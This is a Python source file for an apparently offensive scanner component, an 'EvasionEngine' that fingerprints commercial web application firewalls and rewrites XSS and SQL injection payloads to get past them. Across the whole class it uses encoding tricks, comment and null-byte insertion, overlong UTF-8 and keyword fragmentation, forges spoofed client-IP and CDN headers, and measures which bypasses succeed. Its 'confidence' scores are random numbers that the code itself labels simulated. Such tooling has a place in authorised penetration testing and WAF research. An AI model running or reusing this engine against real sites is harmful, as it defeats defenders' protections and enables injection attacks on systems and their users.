import random
import base64
import urllib.parse
import re
import json
from typing import List, Dict, Any, Optional
from urllib.parse import quote, unquote
from app.core.logger import logger

class EvasionEngine:
    """Advanced WAF evasion and bypass techniques for Phase 3"""
    
    def __init__(self):
        self.encoding_techniques = [
            'url_encode', 'double_url_encode', 'unicode_encode',
            'base64_encode', 'hex_encode', 'html_entity_encode',
            'utf8_encode', 'mixed_case_hex', 'overlong_utf8'
        ]
        
        self.obfuscation_techniques = [
            'case_variation', 'comment_insertion', 'whitespace_variation',
            'concatenation', 'string_splitting', 'keyword_fragmentation',
            'null_byte_injection', 'parameter_pollution'
        ]
        
        # WAF-specific bypass techniques
        self.waf_signatures = {
            'cloudflare': {
                'detection_patterns': ['<script', 'javascript:', 'onerror=', 'onload='],
                'bypass_techniques': ['html_entity_encode', 'unicode_encode', 'comment_insertion']
            },
            'aws_waf': {
                'detection_patterns': ['union select', 'or 1=1', '../', 'etc/passwd'],
                'bypass_techniques': ['case_variation', 'concatenation', 'whitespace_variation']
            },
            'akamai': {
                'detection_patterns': ['<script>', 'alert(', 'prompt(', 'confirm('],
                'bypass_techniques': ['mixed_case_hex', 'overlong_utf8', 'keyword_fragmentation']
            },
            'imperva': {
                'detection_patterns': ['select.*from', 'drop table', 'exec(', 'system('],
                'bypass_techniques': ['null_byte_injection', 'parameter_pollution', 'double_url_encode']
            }
        }
        
        # Advanced payload transformations
        self.transformation_chains = [
            ['case_variation', 'comment_insertion'],
            ['unicode_encode', 'url_encode'],
            ['keyword_fragmentation', 'concatenation'],
            ['html_entity_encode', 'whitespace_variation']
        ]
    
    def evade_payload(self, payload: str, technique: str = 'auto', waf_type: str = None) -> str:
        """Apply advanced evasion technique to payload"""
        if technique == 'auto':
            if waf_type and waf_type in self.waf_signatures:
                # Use WAF-specific techniques
                technique = random.choice(self.waf_signatures[waf_type]['bypass_techniques'])
            else:
                technique = random.choice(self.encoding_techniques + self.obfuscation_techniques)
        
        # Apply transformation
        if technique == 'url_encode':
            return urllib.parse.quote(payload, safe='')
        elif technique == 'double_url_encode':
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        elif technique == 'unicode_encode':
            return self._unicode_encode(payload)
        elif technique == 'base64_encode':
            return base64.b64encode(payload.encode()).decode()
        elif technique == 'hex_encode':
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif technique == 'html_entity_encode':
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif technique == 'case_variation':
            return self._case_variation(payload)
        elif technique == 'comment_insertion':
            return self._insert_comments(payload)
        elif technique == 'whitespace_variation':
            return self._whitespace_variation(payload)
        elif technique == 'concatenation':
            return self._string_concatenation(payload)
        elif technique == 'string_splitting':
            return self._string_splitting(payload)
        elif technique == 'utf8_encode':
            return self._utf8_encode(payload)
        elif technique == 'mixed_case_hex':
            return self._mixed_case_hex(payload)
        elif technique == 'overlong_utf8':
            return self._overlong_utf8(payload)
        elif technique == 'keyword_fragmentation':
            return self._keyword_fragmentation(payload)
        elif technique == 'null_byte_injection':
            return self._null_byte_injection(payload)
        elif technique == 'parameter_pollution':
            return self._parameter_pollution(payload)
        
        return payload
    
    def generate_waf_bypass_headers(self, waf_type: str = None) -> Dict[str, str]:
        """Generate advanced headers to bypass WAF detection"""
        bypass_headers = {
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-ProxyUser-Ip': '127.0.0.1',
            'X-Cluster-Client-IP': '127.0.0.1',
            'X-True-Client-IP': '127.0.0.1',
            'CF-Connecting-IP': '127.0.0.1',
            'True-Client-IP': '127.0.0.1',
            'X-Azure-ClientIP': '127.0.0.1',
            'X-Azure-SocketIP': '127.0.0.1'
        }
        
        # WAF-specific headers
        if waf_type == 'cloudflare':
            bypass_headers.update({
                'CF-IPCountry': 'US',
                'CF-RAY': f'{random.randint(100000000000000000, 999999999999999999)}-DFW',
                'CF-Visitor': '{"scheme":"https"}'
            })
        elif waf_type == 'aws_waf':
            bypass_headers.update({
                'X-Amzn-Trace-Id': f'Root=1-{random.randint(10000000, 99999999)}-{random.randint(100000000000000000, 999999999999999999)}',
                'X-Forwarded-Proto': 'https'
            })
        elif waf_type == 'akamai':
            bypass_headers.update({
                'Akamai-Origin-Hop': '1',
                'True-Client-IP': '127.0.0.1'
            })
        
        # Content-Type manipulation
        content_types = [
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
            'application/json',
            'application/xml'
        ]
        bypass_headers['Content-Type'] = random.choice(content_types)
        
        # Return random subset with WAF-specific additions
        base_count = random.randint(3, 6)
        selected = random.sample(list(bypass_headers.items()), k=min(base_count, len(bypass_headers)))
        return dict(selected)
    
    def create_waf_bypass_variants(self, payload: str, waf_type: str = None) -> List[str]:
        """Create multiple advanced WAF bypass variants of a payload"""
        variants = [payload]  # Original payload
        
        # Single technique variants
        techniques = ['url_encode', 'case_variation', 'comment_insertion', 'unicode_encode', 
                     'utf8_encode', 'mixed_case_hex', 'keyword_fragmentation']
        
        for technique in techniques:
            try:
                variant = self.evade_payload(payload, technique, waf_type)
                if variant != payload and variant not in variants:
                    variants.append(variant)
            except Exception:
                continue
        
        # Transformation chain variants
        for chain in self.transformation_chains[:3]:  # Limit chains
            try:
                variant = payload
                for technique in chain:
                    variant = self.evade_payload(variant, technique, waf_type)
                if variant != payload and variant not in variants:
                    variants.append(variant)
            except Exception:
                continue
        
        return variants[:8]  # Limit to 8 variants
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encoding evasion"""
        result = ""
        for char in payload:
            if random.random() < 0.3:  # 30% chance to encode
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
    
    def _case_variation(self, payload: str) -> str:
        """Random case variation"""
        return ''.join(
            char.upper() if random.random() < 0.5 else char.lower()
            for char in payload
        )
    
    def _insert_comments(self, payload: str) -> str:
        """Insert SQL/HTML comments"""
        if 'select' in payload.lower():
            return payload.replace(' ', '/**/').replace('SELECT', 'SEL/**/ECT')
        elif '<script' in payload.lower():
            return payload.replace('<script', '<scr<!---->ipt')
        return payload
    
    def _whitespace_variation(self, payload: str) -> str:
        """Vary whitespace characters"""
        whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
        return ''.join(
            random.choice(whitespace_chars) if char == ' ' else char
            for char in payload
        )
    
    def _string_concatenation(self, payload: str) -> str:
        """String concatenation for SQL injection"""
        if "'" in payload:
            return payload.replace("'", "'+'")
        return payload
    

    
    def _utf8_encode(self, payload: str) -> str:
        """UTF-8 encoding with percent encoding"""
        return ''.join(f'%{ord(c):02X}' if ord(c) > 127 else c for c in payload)
    
    def _mixed_case_hex(self, payload: str) -> str:
        """Mixed case hexadecimal encoding"""
        result = ""
        for char in payload:
            if random.random() < 0.4:  # 40% chance to encode
                hex_val = f'{ord(char):02x}'
                # Randomly mix case
                hex_val = ''.join(c.upper() if random.random() < 0.5 else c for c in hex_val)
                result += f'\\x{hex_val}'
            else:
                result += char
        return result
    
    def _overlong_utf8(self, payload: str) -> str:
        """Overlong UTF-8 encoding for bypass"""
        result = ""
        for char in payload:
            if char in ['<', '>', '"', "'", '&'] and random.random() < 0.6:
                # Create overlong encoding
                code = ord(char)
                if code < 128:
                    # 2-byte overlong encoding
                    result += f'%C{(code >> 6) | 0x40:X}%{(code & 0x3F) | 0x80:02X}'
                else:
                    result += char
            else:
                result += char
        return result
    
    def _keyword_fragmentation(self, payload: str) -> str:
        """Fragment keywords to avoid detection"""
        keywords = ['script', 'alert', 'prompt', 'confirm', 'eval', 'function', 
                   'select', 'union', 'insert', 'delete', 'update', 'drop']
        
        result = payload
        for keyword in keywords:
            if keyword.lower() in result.lower():
                # Fragment the keyword
                mid = len(keyword) // 2
                fragmented = f'{keyword[:mid]}/**/{keyword[mid:]}'
                result = re.sub(re.escape(keyword), fragmented, result, flags=re.IGNORECASE)
        
        return result
    
    def _null_byte_injection(self, payload: str) -> str:
        """Inject null bytes for bypass"""
        # Insert null bytes at strategic positions
        if 'script' in payload.lower():
            return payload.replace('script', 'scr\x00ipt')
        elif 'select' in payload.lower():
            return payload.replace('select', 'sel\x00ect')
        elif 'union' in payload.lower():
            return payload.replace('union', 'uni\x00on')
        return payload
    
    def _parameter_pollution(self, payload: str) -> str:
        """Create parameter pollution variant"""
        # This is more of a structural change, return modified payload
        return f'{payload}&dummy=1&{payload}'
    
    def detect_waf_type(self, response_headers: Dict[str, str], response_body: str = "") -> Optional[str]:
        """Detect WAF type from response headers and body"""
        headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
        body_lower = response_body.lower()
        
        # Cloudflare detection
        if ('cf-ray' in headers_lower or 
            'cloudflare' in body_lower or 
            'cf-cache-status' in headers_lower):
            return 'cloudflare'
        
        # AWS WAF detection
        if ('x-amzn-requestid' in headers_lower or 
            'x-amz-cf-id' in headers_lower or 
            'cloudfront' in body_lower):
            return 'aws_waf'
        
        # Akamai detection
        if ('akamai' in body_lower or 
            'x-akamai' in str(headers_lower) or 
            'ghost' in headers_lower.get('server', '')):
            return 'akamai'
        
        # Imperva detection
        if ('imperva' in body_lower or 
            'incapsula' in body_lower or 
            'x-iinfo' in headers_lower):
            return 'imperva'
        
        # ModSecurity detection
        if ('mod_security' in body_lower or 
            'modsecurity' in body_lower):
            return 'modsecurity'
        
        return None
    
    def generate_advanced_bypass_payload(self, base_payload: str, target_type: str = 'xss', 
                                       waf_type: str = None) -> Dict[str, Any]:
        """Generate advanced bypass payload with multiple techniques"""
        result = {
            'original': base_payload,
            'variants': [],
            'headers': self.generate_waf_bypass_headers(waf_type),
            'techniques_used': [],
            'waf_type': waf_type
        }
        
        # Create variants using different techniques
        variants = self.create_waf_bypass_variants(base_payload, waf_type)
        
        for variant in variants:
            if variant != base_payload:
                result['variants'].append({
                    'payload': variant,
                    'encoding': self._detect_encoding_used(base_payload, variant),
                    'confidence': random.uniform(0.6, 0.9)  # Simulated confidence
                })
        
        # Add target-specific optimizations
        if target_type == 'xss':
            result['variants'].extend(self._generate_xss_specific_bypasses(base_payload, waf_type))
        elif target_type == 'sqli':
            result['variants'].extend(self._generate_sqli_specific_bypasses(base_payload, waf_type))
        
        return result
    
    def _detect_encoding_used(self, original: str, variant: str) -> str:
        """Detect which encoding technique was used"""
        if '%' in variant and '%' not in original:
            return 'url_encoding'
        elif '\\x' in variant:
            return 'hex_encoding'
        elif '&#' in variant:
            return 'html_entity'
        elif variant != original and variant.lower() != original.lower():
            return 'case_variation'
        elif '/**/' in variant:
            return 'comment_insertion'
        else:
            return 'unknown'
    
    def _generate_xss_specific_bypasses(self, payload: str, waf_type: str) -> List[Dict[str, Any]]:
        """Generate XSS-specific bypass variants"""
        xss_bypasses = []
        
        # Event handler variations
        if 'onerror' in payload.lower():
            variants = ['onError', 'OnError', 'ONERROR', 'on/**/error']
            for variant in variants:
                new_payload = re.sub(r'onerror', variant, payload, flags=re.IGNORECASE)
                xss_bypasses.append({
                    'payload': new_payload,
                    'encoding': 'case_variation',
                    'confidence': 0.7
                })
        
        # Script tag variations
        if '<script' in payload.lower():
            variants = ['<ScRiPt', '<SCRIPT', '<scr<script>ipt', '<scr\x00ipt']
            for variant in variants:
                new_payload = re.sub(r'<script', variant, payload, flags=re.IGNORECASE)
                xss_bypasses.append({
                    'payload': new_payload,
                    'encoding': 'obfuscation',
                    'confidence': 0.8
                })
        
        return xss_bypasses[:3]  # Limit to 3 variants
    
    def _generate_sqli_specific_bypasses(self, payload: str, waf_type: str) -> List[Dict[str, Any]]:
        """Generate SQL injection-specific bypass variants"""
        sqli_bypasses = []
        
        # UNION variations
        if 'union' in payload.lower():
            variants = ['UNION', 'UnIoN', 'uni/**/on', 'uni\x00on']
            for variant in variants:
                new_payload = re.sub(r'union', variant, payload, flags=re.IGNORECASE)
                sqli_bypasses.append({
                    'payload': new_payload,
                    'encoding': 'keyword_obfuscation',
                    'confidence': 0.75
                })
        
        # SELECT variations
        if 'select' in payload.lower():
            variants = ['SELECT', 'SeLeCt', 'sel/**/ect', 'sel\x00ect']
            for variant in variants:
                new_payload = re.sub(r'select', variant, payload, flags=re.IGNORECASE)
                sqli_bypasses.append({
                    'payload': new_payload,
                    'encoding': 'keyword_obfuscation',
                    'confidence': 0.75
                })
        
        return sqli_bypasses[:3]  # Limit to 3 variants
    
    def test_waf_bypass_effectiveness(self, original_blocked: bool, bypass_responses: List[Dict]) -> Dict[str, Any]:
        """Test effectiveness of WAF bypass techniques"""
        if not original_blocked:
            return {'effectiveness': 'not_needed', 'successful_bypasses': 0}
        
        successful_bypasses = []
        for response in bypass_responses:
            # Simple heuristic: if status code is 200 and no block indicators
            if (response.get('status_code') == 200 and 
                'blocked' not in response.get('body', '').lower() and
                'forbidden' not in response.get('body', '').lower()):
                successful_bypasses.append(response)
        
        effectiveness = len(successful_bypasses) / len(bypass_responses) if bypass_responses else 0
        
        return {
            'effectiveness': effectiveness,
            'successful_bypasses': len(successful_bypasses),
            'total_attempts': len(bypass_responses),
            'success_rate': f'{effectiveness * 100:.1f}%',
            'best_techniques': [resp.get('technique', 'unknown') for resp in successful_bypasses[:3]]
        }